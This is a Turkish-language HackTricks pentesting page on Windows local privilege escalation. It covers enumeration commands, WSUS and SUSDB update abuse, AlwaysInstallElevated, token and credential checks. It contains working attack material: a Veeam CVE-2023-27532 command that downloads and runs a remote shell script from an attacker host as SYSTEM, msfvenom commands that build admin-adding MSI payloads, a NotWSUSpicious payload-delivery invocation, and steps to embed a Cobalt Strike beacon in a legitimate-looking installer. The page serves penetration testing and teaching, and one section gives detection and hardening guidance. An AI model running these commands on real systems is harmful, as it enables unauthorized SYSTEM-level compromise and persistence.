# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vector'larını bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, birkaç temel guide'dan alınan genel Windows privilege-escalation metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik enumeration akışı ayrıca community workshop'larına ve checklist'lere dayanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel attack materyali, Windows privilege escalation hakkındaki DerbyCon sunumunu içerir.<sup>[[5]](#references)</sup>

## Initial Windows Theory

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı veya hatta **aktivitelerinizi detect etmenizi engelleyebilecek** farklı şeyler vardır. Privilege escalation enumeration'a başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **defense** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physical access, offline bir UEFI NVRAM düzenlemesini pre-boot DMA'ya ve Windows `SYSTEM` memory-patching chain'ine dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri bypass edildiğinde prompt olmadan High IL seviyesine ulaşmak için abuse edilebilir. Özel UIAccess/Admin Protection bypass workflow'unu buradan kontrol edin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, arbitrary bir SYSTEM registry write için abuse edilebilir (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Recent Windows build'leri ayrıca, privileged local NTLM authentication'ın yeniden kullanılan bir SMB TCP connection üzerinden reflect edildiği bir **SMB arbitrary-port** LPE path'i de kullanıma sundu:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version'ının bilinen bir vulnerability'ye sahip olup olmadığını kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bir Windows ortamının sunduğu **muazzam saldırı yüzeyini** gösterir.

**Sistem üzerinde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'u içerir)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve script'lerin bazı bölümleri dahildir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümünde yer alan talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betiğin yürütülmesine ilişkin eksiksiz etkinlik ve tam içerik kaydı tutulur; böylece her kod bloğu çalıştığı sırada belgelenir. Bu süreç, adli incelemeler ve kötü amaçlı davranışların analizi için değerli olan her etkinliğin kapsamlı bir denetim izini korur. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için logging olayları Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http yerine http**S** kullanılarak istenmiyorsa sistemi tehlikeye atabilirsiniz.

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını kontrol etmek için cmd'de aşağıdakini çalıştırarak başlayın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakini:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Bunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O halde, **exploitable durumdadır.** Son registry değeri `0` ise WSUS girdisi göz ardı edilir.

Bu vulnerability'leri exploit etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Bunlar, SSL olmayan WSUS trafiğine "fake" update'ler enjekte etmek için kullanılan MiTM weaponized exploit script'leridir.

Araştırmayı buradan okuyabilirsiniz:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak bu, bug'ın exploit ettiği flaw'dur:

> Local user proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi asset'imizdeki trafiğimizi intercept etmek ve elevated user olarak code çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'ı local olarak çalıştırma yetkisine sahip oluruz.
>
> Ayrıca WSUS service mevcut user'ın ayarlarını kullandığından, onun certificate store'unu da kullanır. WSUS hostname'i için self-signed bir certificate oluşturup bu certificate'i mevcut user'ın certificate store'una eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, certificate üzerinde trust-on-first-use tipi bir validation uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan certificate user tarafından trusted ise ve doğru hostname'e sahipse service tarafından kabul edilir.

Bu vulnerability'yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool'unu kullanarak exploit edebilirsiniz (liberated olduğunda).

### SUSDB custom-update abuse: `.txt`/`.esd` üzerinden unsigned payload'lar

Bu, bir HTTP WSUS connection'ını intercept etmekten farklı bir trust-boundary failure'dır: ön koşul, custom update yayınlamak ve approve etmek için **WSUS database'inin (`SUSDB`) stored procedure'lerine** yeterli erişimdir. Pratik bir giriş yolu, upstream WSUS computer account'unu `SUSDB` barındıran ayrı bir MSSQL server'a relay etmektir; kesin ön koşul deployment'a göre değişir, bu nedenle SQL administrator haklarını varsaymak yerine önce `EXECUTE` permissions'larını enumerate edin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authentication'ını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı attack path için bkz. [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Update'i build etme, hedefleme ve approve etme

Custom-update workflow'u, restricted bir publishing API olarak legitimate WSUS procedure'lerini kullanır. Önemli state transition'lar şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Update metadata'sını import etme | `spImportUpdate` |
| Prerequisite, localized ve extended XML fragment'larını depolama | `spSaveXMLFragment` |
| Content digest'ini attacker-controlled URL ile ilişkilendirme | `spSetBatchURL` |
| Bir computer group'u enumerate/create etme ve client'ı ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu group için installation'ı approve etme | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

File name, digest'ler, size ve `CommandLineInstallation` handler'ı import edilen metadata/fragment'lar arasında uyumlu olmalıdır. Content URL'sini ve target group'u atadıktan sonra final approval aşağıdakine benzer; örnek GUID'leri tekrar kullanmak yerine yeni update, group ve deployment identifier'ları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### Uzantı tabanlı imza bypass'ı

WSUS normalde keyfi imzasız çalıştırılabilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, sağlanan dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; ardından `CheckCertificateSignature`, baytların metin veya geçerli bir ESD imajı olduğu önceden doğrulanmadan atlanır. Bu nedenle örneğin `payload.exe.txt` adlı değiştirilmemiş bir PE, içerik doğrulamasından geçebilir ve daha sonra update'in komut satırı kurulum işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir politika/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrısı, WSUS'un kayıtlı içeriği çekmesini sağlar. Origin, BITS'in HTTP beklentilerini karşılamalıdır: yalnızca erişilebilir bir URL yeterli değildir; çünkü aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS senkronizasyonu `EventId=364` hatası üretir.<sup>[[39]](#references)</sup>

Araştırma PoC'su [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bunu çalıştırmak üzere değiştirilmiş bir MSSQL client içerir ve içerik staging'i için `BitsWebServer.py` dosyasını sunar. Yetkilendirilmiş minimal bir lab çağrısı şöyledir:<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### Kullanıcı müdahalesi olmadan çalıştırma ve yeniden deneme kalıcılığı

İstemci tarafı etkileşim policy'ye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altındaki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından manuel olarak seçilmesine gerek kalmadan yapılandırılan zamanlamaya göre indirilip yüklenmesini sağlar. Testlerde, güncellemesi başarısız veya tamamlanmamış durumda kalan bir payload, callback süreci sonlandıktan hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı tekrarlanan execution persistence haline gelebilir. Ancak istemci update-failed durumunu açığa çıkardığı için gürültülüdür.<sup>[[39]](#references)</sup>

#### Detection ve hardening yönlendirmeleri

Bu zincirden elde edilebilecek faydalı server- ve client-side yönlendirmeler şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırılmasını audit edin; yeni targeting gruplarını, harici content origin'lerini, `.txt`/`.esd` update payload'larını ve beklenmeyen principal'lar (özellikle computer account olmayan hesaplar) tarafından gerçekleştirilen deployment'ları araştırın.
- `C:\Program Files\Update Services\LogFiles` dizininde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; verification işlemini payload extension ve content magic ile ilişkilendirin, suffix'e güvenmeyin.
- Windows Update installation işleminin tekrar tekrar başarısız olup yeniden denendiğini ve `.txt` veya `.esd` adları taşıyan content'ten gerçekleştirilen PE execution ya da beklenmeyen child/network activity'yi araştırın.
- Desteklendiği yerlerde database service için Extended Protection for Authentication zorunlu tutun ve database network erişimini WSUS server ile yetkili administrative system'lerle sınırlandırın. Custom-update procedure'larındaki `EXECUTE` haklarını en aza indirin ve audit edin.

## Third-Party Auto-Updaters ve Agent IPC (local privesc)

Birçok enterprise agent, localhost IPC surface'i ve privileged update channel'ı açığa çıkarır. Enrollment işlemi bir attacker server'a yönlendirilebiliyor ve updater rogue root CA'ya veya zayıf signer kontrollerine güveniyorsa, local user kötü amaçlı bir MSI teslim ederek SYSTEM service tarafından yüklenmesini sağlayabilir. Genelleştirilmiş bir technique'i (Netskope stAgentSvc chain'i – CVE-2025-0309 temel alınarak) burada bulabilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam B&R < `11.0.1.1261`, **TCP/9401** üzerinde attacker-controlled message'ları işleyen bir localhost service'i açığa çıkarır ve **NT AUTHORITY\SYSTEM** olarak arbitrary command çalıştırılmasına izin verir.<sup>[[12]](#references)</sup>

- **Recon**: listener'ı ve version'ı doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle birlikte aynı dizine yerleştirin, ardından local socket üzerinden bir SYSTEM payload'ını tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **yerel ayrıcalık yükseltme** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing** özelliğinin zorunlu kılınmadığı, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına olanak tanıyan self-rights izinlerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabilmesi bulunur. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

**Exploit'i** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyine sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'ın `Write-UserAddMSI` komutunu kullanarak mevcut dizinin içinde ayrıcalıkları yükseltmek için bir Windows MSI binary'si oluşturun. Bu script, kullanıcı/grup ekleme istemi görüntüleyen önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):
```
Write-UserAddMSI
```
Oluşturulan binary'yi privilege escalation gerçekleştirmek için çalıştırmanız yeterlidir.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command lines** **execute** etmek istiyorsanız "**.bat**" dosyasını wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **new Windows EXE TCP payload** **Generate** edin.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'a tıklayın.
- 4 adımın 3. adımına (dahil edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform**'u **x86**'dan **x64**'e değiştirin.
- **Author** ve **Manufacturer** gibi değiştirebileceğiniz ve installed app'in daha legitimate görünmesini sağlayabilecek başka properties de vardır.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneğini belirleyin.
- **Install**'a sağ tıklayın ve **Add Custom Action** seçeneğini belirleyin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz Beacon payload'ın execute edilmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **installation**'ını **background**'da execute etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyetten yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar nelerin **loglandığını** belirler, bu nedenle dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek açısından ilgi çekicidir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve bir domaine katılmış bilgisayarlardaki her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; bu kullanıcılar yetkilendirildiklerinde yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, **Local Security Authority (LSA)** için, güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engelleyen** gelişmiş koruma sunarak sistemi daha da güvenli hâle getirdi.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunulmuştur. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için domain credentials genellikle oluşturulur.\
[**Cached Credentials hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**Ayrıcalıklı bir gruba dahilseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıkları yükseltmek için bunların nasıl kötüye kullanılacağı hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token**'ın ne olduğu hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar** ve bunların nasıl kötüye kullanılacağı hakkında **bilgi edinmek** için aşağıdaki sayfayı inceleyin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Her şeyden önce, işlemleri listelerken **işlemin komut satırında parolaları kontrol edin**.\
Çalışan herhangi bir binary dosyanın üzerine **yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) saldırılarından yararlanmak için binary klasöründe yazma izinlerinizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışan [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; ayrıcalıkları yükseltmek için bunları abuse edebilirsiniz.

**Process binary'lerinin izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Process binary'lerinin klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals içerisindeki **procdump** aracını kullanarak çalışan bir process'in memory dump'ını oluşturabilirsiniz. FTP gibi servisler **credentials'ları memory'de clear text olarak** tutar; memory'yi dump etmeyi ve credentials'ları okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına olanak sağlayabilir.**

